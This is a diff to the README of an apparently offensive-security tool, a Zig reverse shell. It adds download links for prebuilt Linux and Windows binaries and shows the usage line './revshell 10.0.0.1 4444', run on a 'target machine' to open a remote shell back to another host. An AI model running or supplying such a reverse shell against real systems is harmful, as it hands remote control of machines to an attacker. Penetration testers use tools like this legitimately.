@@ -2,7 +2,10 @@
 
 ## Download
 
-<!-- Pre-compiled version is available in [releases](https://github.com/hideckies/xex/releases). -->
+Get the binary for your target platform.
+
+Linux: [Download](https://github.com/hideckies/zig-revshell/releases/download/0.0.1/revshell-linux-x86_64)  
+Windows: [Download](https://github.com/hideckies/zig-revshell/releases/download/0.0.1/revshell-windows-x86_64.exe)
 
 <br />
 
@@ -24,7 +27,7 @@ After that, the executable is generated under `zig-out/bin` directory.
 
 ## Usage
 
-Execute the revshell in your target machine:
+Execute the binary in your target machine:
 
 ```sh
 ./revshell 10.0.0.1 4444
